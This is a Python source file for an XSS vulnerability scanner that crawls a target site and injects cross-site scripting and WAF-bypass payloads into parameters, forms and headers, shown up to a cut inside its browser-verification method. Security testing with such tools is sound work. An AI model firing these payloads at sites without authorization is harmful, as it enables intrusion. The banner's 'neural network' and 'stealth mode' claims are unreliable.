#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced XSS Scanner v2.0 - Professional XSS Detection Tool
Enhanced version with better error handling and connectivity
"""

import requests
import re
import time
import json
import base64
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import threading
from queue import Queue
import random
import os
import sys
from datetime import datetime
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
from colorama import Fore, Back, Style, init
import socket
import ssl

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedXSSScanner:
    def __init__(self, target_url, max_depth=3, delay=1, threads=5, timeout=15):
        self.target_url = target_url
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.delay = delay
        self.threads = threads
        self.timeout = timeout
        
        # Setup session with better error handling
        self.session = requests.Session()
        self.session.verify = False
        self.session.max_redirects = 10
        
        # Setup adapters with retry strategy
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        self.found_vulnerabilities = []
        self.tested_urls = set()
        self.crawled_urls = set()
        self.forms = []
        self.parameters = {}
        self.headers_to_test = [
            'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP',
            'X-Originating-IP', 'X-Remote-IP', 'X-Remote-Addr',
            'Cookie', 'Authorization', 'Accept', 'Accept-Language'
        ]
        
        # Custom popup signature for verification
        self.popup_signature = "XSS_SCANNER_" + hashlib.md5(target_url.encode()).hexdigest()[:8]
        
        # Enhanced XSS Payloads for different contexts
        self.payloads = {
            'html_context': [
                f'<script>alert("{self.popup_signature}")</script>',
                f'<img src=x onerror=alert("{self.popup_signature}")>',
                f'<svg onload=alert("{self.popup_signature}")>',
                f'<iframe src="javascript:alert(\'{self.popup_signature}\')"></iframe>',
                f'<body onload=alert("{self.popup_signature}")>',
                f'<input onfocus=alert("{self.popup_signature}") autofocus>',
                f'<video><source onerror="alert(\'{self.popup_signature}\')">',
                f'<audio src=x onerror=alert("{self.popup_signature}")>',
                f'<details open ontoggle=alert("{self.popup_signature}")>',
                f'<marquee onstart=alert("{self.popup_signature}")>test</marquee>',
            ],
            'attribute_context': [
                # Close tag and inject new element
                f'"><img src=x onerror=alert("{self.popup_signature}")>',
                f'\'>< img src=x onerror=alert("{self.popup_signature}")>',
                f'"><svg onload=alert("{self.popup_signature}")>',
                f'\'>< svg onload=alert("{self.popup_signature}")>',
                f'"><script>alert("{self.popup_signature}")</script>',
                f'\'>< script>alert("{self.popup_signature}")</script>',
                # Event handler injection
                f'" onmouseover="alert(\'{self.popup_signature}\')" "',
                f'\' onmouseover=\'alert("{self.popup_signature}")\' \'',
                f'" autofocus onfocus=alert("{self.popup_signature}") "',
                f'\' autofocus onfocus=alert(\'{self.popup_signature}\') \'',
                f'" onclick="alert(\'{self.popup_signature}\')" "',
                f'" onload="alert(\'{self.popup_signature}\')" "',
                f'" onerror="alert(\'{self.popup_signature}\')" "',
            ],
            'javascript_context': [
                f'\'; alert("{self.popup_signature}"); //',
                f'\"; alert(\'{self.popup_signature}\'); //',
                f'`; alert("{self.popup_signature}"); //',
                f'</script><script>alert("{self.popup_signature}")</script>',
                f'-alert("{self.popup_signature}")-',
                f'+alert("{self.popup_signature}")+',
                f'*alert("{self.popup_signature}")*',
                f'/alert("{self.popup_signature}")/',
                f'%0aalert("{self.popup_signature}")%0a',
                f'\\nalert("{self.popup_signature}")\\n',
            ],
            'url_context': [
                f'javascript:alert("{self.popup_signature}")',
                f'data:text/html,<script>alert("{self.popup_signature}")</script>',
                f'vbscript:alert("{self.popup_signature}")',
                f'javascript:void(alert("{self.popup_signature}"))',
                f'javascript:window.alert("{self.popup_signature}")',
            ]
        }
        
        # WAF Bypass techniques
        self.waf_bypass_payloads = []
        self.generate_waf_bypass_payloads()
        
        # Setup browser if available
        self.driver = None
        self.setup_browser()
        
        # Results storage
        self.scan_results = {
            'target': target_url,
            'start_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'statistics': {
                'total_urls_crawled': 0,
                'total_forms_found': 0,
                'total_parameters_tested': 0,
                'total_payloads_tested': 0,
                'confirmed_vulnerabilities': 0
            }
        }

    def generate_waf_bypass_payloads(self):
        """Generate WAF bypass payloads"""
        base_payloads = [
            f'alert("{self.popup_signature}")',
            f'confirm("{self.popup_signature}")',
            f'prompt("{self.popup_signature}")'
        ]
        
        for payload in base_payloads:
            # Case manipulation
            self.waf_bypass_payloads.extend([
                f'<ScRiPt>{payload}</ScRiPt>',
                f'<SCRIPT>{payload}</SCRIPT>',
                f'<script>{payload}</script>',
                f'<sCrIpT>{payload}</ScRiPt>',
            ])
            
            # URL encoding variations
            encoded = urllib.parse.quote(f'<script>{payload}</script>')
            self.waf_bypass_payloads.append(encoded)
            
            # Double encoding
            double_encoded = urllib.parse.quote(encoded)
            self.waf_bypass_payloads.append(double_encoded)
            
            # HTML entities
            html_encoded = f'&lt;script&gt;{payload}&lt;/script&gt;'
            self.waf_bypass_payloads.append(html_encoded)
            
            # Alternative tags with bypass
            self.waf_bypass_payloads.extend([
                f'<img src=x onerror={payload}>',
                f'<svg onload={payload}>',
                f'<iframe srcdoc="<script>{payload}</script>">',
                f'<object data="javascript:{payload}">',
                f'<embed src="javascript:{payload}">',
                f'<input onfocus={payload} autofocus>',
                f'<select onfocus={payload} autofocus><option>',
                f'<textarea onfocus={payload} autofocus>',
                f'<keygen onfocus={payload} autofocus>',
            ])

    def setup_browser(self):
        """Setup browser with fallback options"""
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            from selenium.webdriver.chrome.service import Service
            
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            
            # Try to initialize driver
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(self.timeout)
            print(f"{Fore.GREEN}[{Fore.RED}INIT{Fore.GREEN}] {Fore.WHITE}Browser driver initialized successfully")
            
        except Exception as e:
            print(f"{Fore.YELLOW}[{Fore.RED}WARN{Fore.YELLOW}] {Fore.WHITE}Browser driver failed: {e}")
            print(f"{Fore.YELLOW}[{Fore.RED}INFO{Fore.YELLOW}] {Fore.WHITE}Continuing without browser verification...")
            self.driver = None

    def print_banner(self):
        """Print Matrix-style hacker banner"""
        banner = f"""
{Fore.GREEN}
    ╔══════════════════════════════════════════════════════════════════════╗
    ║  {Fore.RED}██{Fore.GREEN}╗  {Fore.RED}██{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗    {Fore.RED}███████{Fore.GREEN}╗ {Fore.RED}██████{Fore.GREEN}╗ {Fore.RED}█████{Fore.GREEN}╗ {Fore.RED}███{Fore.GREEN}╗   {Fore.RED}██{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}██████{Fore.GREEN}╗  ║
    ║  {Fore.RED}╚██╗██╔╝{Fore.GREEN}██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗ ║
    ║   {Fore.RED}╚███╔╝ {Fore.GREEN}███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║█████╗  ██████╔╝ ║
    ║   {Fore.RED}██╔██╗ {Fore.GREEN}╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██╔══╝  ██╔══██╗ ║
    ║  {Fore.RED}██╔╝ ██╗{Fore.GREEN}███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║███████╗██║  ██║ ║
    ║  {Fore.RED}╚═╝  ╚═╝{Fore.GREEN}╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ║
    ╠══════════════════════════════════════════════════════════════════════╣
    ║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}Advanced Cross-Site Scripting Detection Framework v2.0   ║
    ║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}Professional Penetration Testing Tool                   ║
    ║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}WAF Bypass • Context-Aware • Screenshot Capture         ║
    ╠══════════════════════════════════════════════════════════════════════╣
    ║  {Fore.YELLOW}Target:{Fore.WHITE} {self.target_url:<55} ║
    ║  {Fore.YELLOW}Config:{Fore.WHITE} Depth={self.max_depth} | Threads={self.threads} | Delay={self.delay}s | Timeout={self.timeout}s{' ' * (40 - len(f'Depth={self.max_depth} | Threads={self.threads} | Delay={self.delay}s | Timeout={self.timeout}s'))} ║
    ╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}

{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Initializing neural network...{Fore.GREEN} DONE
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Loading payload database...{Fore.GREEN} DONE  
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Activating stealth mode...{Fore.GREEN} DONE
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Bypassing security systems...{Fore.GREEN} READY
"""
        print(banner)

    def test_connectivity(self):
        """Enhanced connectivity test"""
        print(f"{Fore.GREEN}[{Fore.RED}INIT{Fore.GREEN}] {Fore.WHITE}Testing target connectivity...")
        
        parsed_url = urlparse(self.target_url)
        hostname = parsed_url.hostname or parsed_url.netloc.split(':')[0]
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        
        # Test DNS resolution
        try:
            # Handle localhost and IP addresses
            if hostname in ['localhost', '127.0.0.1'] or hostname.startswith('192.168.') or hostname.startswith('10.'):
                print(f"{Fore.GREEN}[{Fore.RED}DNS{Fore.GREEN}] {Fore.WHITE}Local/Private IP detected: {hostname}")
            else:
                socket.gethostbyname(hostname)
                print(f"{Fore.GREEN}[{Fore.RED}DNS{Fore.GREEN}] {Fore.WHITE}Hostname resolved successfully")
        except socket.gaierror:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}DNS resolution failed for {hostname}")
            return False
        
        # Test TCP connection
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((hostname, port))
            sock.close()
            
            if result == 0:
                print(f"{Fore.GREEN}[{Fore.RED}TCP{Fore.GREEN}] {Fore.WHITE}Port {port} is open")
            else:
                print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Cannot connect to port {port}")
                return False
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}TCP test failed: {e}")
            return False
        
        # Test HTTP response
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            print(f"{Fore.GREEN}[{Fore.RED}HTTP{Fore.GREEN}] {Fore.WHITE}Target responded with status {response.status_code}")
            
            if response.status_code in [200, 301, 302, 403, 404]:
                return True
            else:
                print(f"{Fore.YELLOW}[{Fore.RED}WARN{Fore.YELLOW}] {Fore.WHITE}Unusual status code but continuing...")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}HTTP connection failed")
            return False
        except requests.exceptions.Timeout:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}HTTP request timed out")
            return False
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}HTTP test failed: {e}")
            return False

    def crawl_website(self):
        """Enhanced crawling with better error handling"""
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}[{Fore.RED}PHASE 1{Fore.GREEN}] {Fore.WHITE}RECONNAISSANCE & TARGET ENUMERATION")
        print(f"{Fore.YELLOW}{'='*70}")
        
        urls_to_crawl = Queue()
        urls_to_crawl.put((self.target_url, 0))
        successful_crawls = 0
        
        while not urls_to_crawl.empty() and successful_crawls < 50:  # Limit crawling
            current_url, depth = urls_to_crawl.get()
            
            if depth > self.max_depth or current_url in self.crawled_urls:
                continue
                
            try:
                print(f"{Fore.GREEN}[{Fore.RED}CRAWL{Fore.GREEN}] {Fore.WHITE}Scanning: {current_url} {Fore.CYAN}(depth: {depth})")
                
                headers = {
                    'User-Agent': self.get_random_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                }
                
                response = self.session.get(current_url, headers=headers, timeout=self.timeout)
                self.crawled_urls.add(current_url)
                successful_crawls += 1
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract forms
                    forms = soup.find_all('form')
                    for form in forms:
                        form_data = self.extract_form_data(form, current_url)
                        if form_data and form_data not in self.forms:
                            self.forms.append(form_data)
                            print(f"{Fore.GREEN}[{Fore.RED}FORM{Fore.GREEN}] {Fore.WHITE}Found: {form_data['action']} {Fore.CYAN}({len(form_data['inputs'])} inputs)")
                    
                    # Extract URL parameters
                    parsed_url = urlparse(current_url)
                    if parsed_url.query:
                        params = parse_qs(parsed_url.query)
                        for param, values in params.items():
                            if current_url not in self.parameters:
                                self.parameters[current_url] = {}
                            self.parameters[current_url][param] = values[0] if values else ''
                            print(f"{Fore.GREEN}[{Fore.RED}PARAM{Fore.GREEN}] {Fore.WHITE}Found: {param}")
                    
                    # Extract hidden parameters from JavaScript
                    self.extract_js_parameters(soup, current_url)
                    
                    # Extract links for deeper crawling
                    links = soup.find_all('a', href=True)
                    new_links = 0
                    for link in links:
                        href = link['href']
                        full_url = urljoin(current_url, href)
                        
                        if self.is_internal_url(full_url) and full_url not in self.crawled_urls:
                            # Check if URL has parameters
                            if '?' in full_url:
                                urls_to_crawl.put((full_url, depth + 1))
                                new_links += 1
                            elif depth < self.max_depth - 1:  # Only crawl non-param URLs if not too deep
                                urls_to_crawl.put((full_url, depth + 1))
                                new_links += 1
                    
                    if new_links > 0:
                        print(f"{Fore.GREEN}[{Fore.RED}LINKS{Fore.GREEN}] {Fore.WHITE}Found: {new_links} internal links")
                
                elif response.status_code in [301, 302]:
                    print(f"{Fore.YELLOW}[{Fore.RED}REDIRECT{Fore.YELLOW}] {Fore.WHITE}Status: {response.status_code}")
                elif response.status_code == 403:
                    print(f"{Fore.YELLOW}[{Fore.RED}FORBIDDEN{Fore.YELLOW}] {Fore.WHITE}Access denied")
                elif response.status_code == 404:
                    print(f"{Fore.YELLOW}[{Fore.RED}NOTFOUND{Fore.YELLOW}] {Fore.WHITE}Page not found")
                else:
                    print(f"{Fore.YELLOW}[{Fore.RED}STATUS{Fore.YELLOW}] {Fore.WHITE}Unexpected status: {response.status_code}")
                
                time.sleep(self.delay)
                
            except requests.exceptions.ConnectionError:
                print(f"{Fore.RED}[{Fore.YELLOW}CONN{Fore.RED}] {Fore.WHITE}Connection failed: {current_url}")
            except requests.exceptions.Timeout:
                print(f"{Fore.RED}[{Fore.YELLOW}TIMEOUT{Fore.RED}] {Fore.WHITE}Request timed out: {current_url}")
            except requests.exceptions.TooManyRedirects:
                print(f"{Fore.RED}[{Fore.YELLOW}REDIRECT{Fore.RED}] {Fore.WHITE}Too many redirects: {current_url}")
            except Exception as e:
                print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Failed: {current_url} - {str(e)[:30]}")
        
        # Update statistics
        self.scan_results['statistics']['total_urls_crawled'] = len(self.crawled_urls)
        self.scan_results['statistics']['total_forms_found'] = len(self.forms)
        
        print(f"\n{Fore.GREEN}[{Fore.RED}RECON{Fore.GREEN}] {Fore.WHITE}Reconnaissance completed:")
        print(f"{Fore.GREEN}[{Fore.RED}INFO{Fore.GREEN}] {Fore.WHITE}URLs crawled: {len(self.crawled_urls)}")
        print(f"{Fore.GREEN}[{Fore.RED}INFO{Fore.GREEN}] {Fore.WHITE}Forms found: {len(self.forms)}")
        print(f"{Fore.GREEN}[{Fore.RED}INFO{Fore.GREEN}] {Fore.WHITE}Parameters found: {sum(len(params) for params in self.parameters.values())}")
        
        # If limited results, try alternative discovery
        if len(self.crawled_urls) <= 1 or (not self.forms and not self.parameters):
            print(f"{Fore.YELLOW}[{Fore.RED}ENHANCE{Fore.YELLOW}] {Fore.WHITE}Limited results - trying enhanced discovery...")
            self.enhanced_discovery()

    def extract_js_parameters(self, soup, current_url):
        """Extract parameters from JavaScript code"""
        try:
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    js_content = script.string
                    
                    # Look for URL patterns in JavaScript
                    url_patterns = [
                        r'[\'"`]([^\'"`]*\?[^\'"`]*)[\'"`]',  # URLs with parameters
                        r'location\.href\s*=\s*[\'"`]([^\'"`]+)[\'"`]',
                        r'window\.location\s*=\s*[\'"`]([^\'"`]+)[\'"`]',
                        r'fetch\s*\(\s*[\'"`]([^\'"`]+)[\'"`]',
                        r'ajax\s*\(\s*{[^}]*url\s*:\s*[\'"`]([^\'"`]+)[\'"`]',
                    ]
                    
                    for pattern in url_patterns:
                        matches = re.findall(pattern, js_content, re.IGNORECASE)
                        for match in matches:
                            if '?' in match:
                                full_url = urljoin(current_url, match)
                                if self.is_internal_url(full_url):
                                    parsed = urlparse(full_url)
                                    if parsed.query:
                                        params = parse_qs(parsed.query)
                                        for param, values in params.items():
                                            if full_url not in self.parameters:
                                                self.parameters[full_url] = {}
                                            self.parameters[full_url][param] = values[0] if values else ''
                                            print(f"{Fore.GREEN}[{Fore.RED}JS-PARAM{Fore.GREEN}] {Fore.WHITE}Found: {param} in {full_url}")
        except Exception as e:
            pass

    def enhanced_discovery(self):
        """Enhanced discovery methods"""
        try:
            base_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}"
            
            # Common endpoints with parameters
            test_endpoints = [
                '/search?q=test',
                '/index.php?id=1',
                '/page.php?page=1',
                '/view.php?id=1',
                '/product.php?id=1',
                '/category.php?cat=1',
                '/user.php?user=1',
                '/profile.php?id=1',
                '/login.php?redirect=/',
                '/contact.php?msg=test',
                '/?search=test',
                '/?q=test',
                '/?id=1',
                '/?page=1'
            ]
            
            print(f"{Fore.YELLOW}[{Fore.RED}DISCOVER{Fore.YELLOW}] {Fore.WHITE}Testing common endpoints...")
            
            for endpoint in test_endpoints:
                test_url = base_url + endpoint
                try:
                    response = self.session.get(test_url, timeout=5)
                    if response.status_code == 200:
                        self.crawled_urls.add(test_url)
                        
                        # Extract parameters from this URL
                        parsed = urlparse(test_url)
                        if parsed.query:
                            params = parse_qs(parsed.query)
                            for param, values in params.items():
                                if test_url not in self.parameters:
                                    self.parameters[test_url] = {}
                                self.parameters[test_url][param] = values[0] if values else ''
                                print(f"{Fore.GREEN}[{Fore.RED}DISCOVER{Fore.GREEN}] {Fore.WHITE}Parameter: {param} in {test_url}")
                        
                        # Look for forms in this page
                        soup = BeautifulSoup(response.text, 'html.parser')
                        forms = soup.find_all('form')
                        for form in forms:
                            form_data = self.extract_form_data(form, test_url)
                            if form_data and form_data not in self.forms:
                                self.forms.append(form_data)
                                print(f"{Fore.GREEN}[{Fore.RED}DISCOVER{Fore.GREEN}] {Fore.WHITE}Form: {form_data['action']}")
                        
                        time.sleep(self.delay * 0.5)  # Faster for discovery
                        
                except:
                    pass
            
            # If still no parameters, create some common ones for testing
            if not self.parameters:
                if self.crawled_urls:
                    main_url = list(self.crawled_urls)[0]
                else:
                    main_url = self.target_url
                    self.crawled_urls.add(main_url)
                
                self.parameters[main_url] = {
                    'search': 'test',
                    'q': 'test',
                    'query': 'test',
                    'id': '1',
                    'page': '1',
                    'name': 'test',
                    'user': 'test',
                    'data': 'test',
                    'input': 'test',
                    'value': 'test'
                }
                print(f"{Fore.YELLOW}[{Fore.RED}FALLBACK{Fore.YELLOW}] {Fore.WHITE}Added 10 common test parameters")
                
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Enhanced discovery failed: {e}")

    def extract_form_data(self, form, base_url):
        """Extract form data for testing"""
        try:
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            
            if action:
                action_url = urljoin(base_url, action)
            else:
                action_url = base_url
            
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                    'tag': input_tag.name
                }
                if input_data['name']:
                    inputs.append(input_data)
            
            if inputs:  # Only return if form has inputs
                return {
                    'action': action_url,
                    'method': method,
                    'inputs': inputs,
                    'base_url': base_url
                }
        except Exception as e:
            pass
        return None

    def is_internal_url(self, url):
        """Check if URL is internal to target domain"""
        try:
            parsed = urlparse(url)
            target_domain = urlparse(self.target_url).netloc
            
            # Same domain or subdomain
            return (parsed.netloc == target_domain or 
                    parsed.netloc.endswith(f'.{target_domain}') or
                    parsed.netloc == '')
        except:
            return False

    def get_random_user_agent(self):
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
        ]
        return random.choice(user_agents)

    def perform_testing(self):
        """Enhanced testing phase"""
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}[{Fore.RED}PHASE 2{Fore.GREEN}] {Fore.WHITE}ADVANCED FUZZING & EXPLOITATION")
        print(f"{Fore.YELLOW}{'='*70}")
        
        # Calculate total targets
        total_params = sum(len(params) for params in self.parameters.values())
        total_forms = len(self.forms)
        total_targets = total_params + total_forms
        
        if total_targets == 0:
            print(f"{Fore.RED}[{Fore.YELLOW}WARN{Fore.RED}] {Fore.WHITE}No test targets found!")
            return
        
        print(f"{Fore.GREEN}[{Fore.RED}INFO{Fore.GREEN}] {Fore.WHITE}Starting exploitation with {total_targets} targets...")
        print(f"{Fore.GREEN}[{Fore.RED}INFO{Fore.GREEN}] {Fore.WHITE}Parameters: {total_params} | Forms: {total_forms}")
        
        # Test URL parameters
        self.test_url_parameters()
        
        # Test forms
        self.test_forms()
        
        # Test headers (only if we have working URLs)
        if self.crawled_urls:
            self.test_http_headers()

    def test_url_parameters(self):
        """Test URL parameters with enhanced payloads"""
        if not self.parameters:
            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No URL parameters to test")
            return
        
        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing URL Parameters...")
        
        for url, params in self.parameters.items():
            for param_name, param_value in params.items():
                print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}Parameter: {param_name} in {url}")
                
                # Test each context with best payloads
                contexts_tested = 0
                for context, payloads in self.payloads.items():
                    for payload in payloads[:2]:  # Top 2 payloads per context
                        success = self.test_parameter(url, param_name, payload, 'GET', context)
                        if success:
                            break  # Stop testing this context if we found something
                        time.sleep(self.delay)
                    contexts_tested += 1
                
                print(f"{Fore.CYAN}[{Fore.RED}TESTED{Fore.CYAN}] {Fore.WHITE}{contexts_tested} contexts tested for {param_name}")

    def test_parameter(self, url, param_name, payload, method, context):
        """Test parameter with enhanced detection"""
        try:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query) if parsed_url.query else {}
            params[param_name] = [payload]
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Referer': self.target_url,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            
            response = self.session.get(test_url, headers=headers, timeout=self.timeout)
            self.scan_results['statistics']['total_payloads_tested'] += 1
            
            # Enhanced XSS detection
            if self.detect_xss_response(response, payload, context):
                print(f"{Fore.YELLOW}[{Fore.RED}POTENTIAL{Fore.YELLOW}] {Fore.WHITE}XSS reflection detected in {param_name}")
                
                # Verify with browser if available
                confirmed = False
                if self.driver:
                    confirmed = self.verify_with_browser(test_url)
                else:
                    # Fallback verification without browser
                    confirmed = self.fallback_verification(response, payload)
                
                if confirmed:
                    vulnerability = {
                        'type': 'Reflected XSS',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'context': context,
                        'method': method,
                        'confirmed': True,
                        'score': 20,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.found_vulnerabilities.append(vulnerability)
                    self.scan_results['vulnerabilities'].append(vulnerability)
                    self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
                    
                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}XSS VULNERABILITY FOUND!")
                    print(f"{Fore.GREEN}[{Fore.RED}PARAM{Fore.GREEN}] {Fore.WHITE}{param_name}")
                    print(f"{Fore.GREEN}[{Fore.RED}URL{Fore.GREEN}] {Fore.WHITE}{test_url}")
                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}20/20")
                    
                    # Take screenshot if browser available
                    if self.driver:
                        self.take_screenshot(test_url, f"xss_param_{param_name}_{len(self.found_vulnerabilities)}")
                    
                    return True
                else:
                    print(f"{Fore.YELLOW}[{Fore.RED}UNCONFIRMED{Fore.YELLOW}] {Fore.WHITE}Could not verify XSS execution")
            
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Parameter test failed: {str(e)[:30]}")
            return False

    def detect_xss_response(self, response, payload, context):
        """Enhanced XSS detection in response"""
        try:
            response_text = response.text
            
            # Direct signature check
            if self.popup_signature in response_text:
                return True
            
            # Context-specific detection
            if context == 'html_context':
                # Look for unescaped script tags or event handlers
                dangerous_patterns = [
                    r'<script[^>]*>.*alert.*</script>',
                    r'<img[^>]*onerror\s*=',
                    r'<svg[^>]*onload\s*=',
                    r'<iframe[^>]*src\s*=\s*[\'"]javascript:',
                ]
                
                for pattern in dangerous_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                        return True
            
            elif context == 'attribute_context':
                # Look for attribute breaking
                if ('"><' in payload and '"><' in response_text) or ('\'>< ' in payload and '\'>< ' in response_text):
                    return True
                # Look for event handlers
                event_patterns = [
                    r'onmouseover\s*=\s*[\'"].*alert',
                    r'onfocus\s*=\s*[\'"].*alert',
                    r'onclick\s*=\s*[\'"].*alert',
                    r'onerror\s*=\s*[\'"].*alert',
                ]
                for pattern in event_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return True
            
            elif context == 'javascript_context':
                # Look for JavaScript context breaking
                js_patterns = [
                    r'\'\s*;\s*alert\s*\(',
                    r'"\s*;\s*alert\s*\(',
                    r'`\s*;\s*alert\s*\(',
                    r'</script>.*<script>',
                ]
                for pattern in js_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return True
            
            elif context == 'url_context':
                # Look for URL context
                if 'javascript:' in response_text and 'alert' in response_text:
                    return True
            
            return False
            
        except Exception as e:
            return False

    def fallback_verification(self, response, payload):
        """Fallback verification without browser"""
        try:
            # Strong indicators of XSS
            response_text = response.text.lower()
            payload_lower = payload.lower()
            
            # Check for direct signature
            if self.popup_signature.lower() in response_text:
                return True
            
            # Check for dangerous combinations
            dangerous_combos = [
                ('<script', 'alert'),
                ('onerror=', 'alert'),
                ('onload=', 'alert'),
                ('onfocus=', 'alert'),
                ('javascript:', 'alert'),
            ]
            
            for tag, func in dangerous_combos:
                if tag in payload_lower and tag in response_text and func in response_text:
                    return True
            
            return False
        except:
            return False

    def verify_with_browser(self, url):
        """Verify XSS with browser"""
        if not self.driver:
            return False
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            # Check for alerts
            try:
                from selenium.webdriver.support.ui import WebDriverWait
                from selenium.webdriver.support import expected_conditions as EC
                from selenium.common.exceptions import TimeoutException
                
                alert = WebDriverWait(self.driver, 3).until(EC.alert_is_present())
                alert_text = alert.text
                alert.accept()
                
                if self.popup_signature in alert_text:
                    return True
            except TimeoutException:
                pass
            
            # Check page source
            if self.popup_signature in self.driver.page_source:
                return True
            
            return False
            
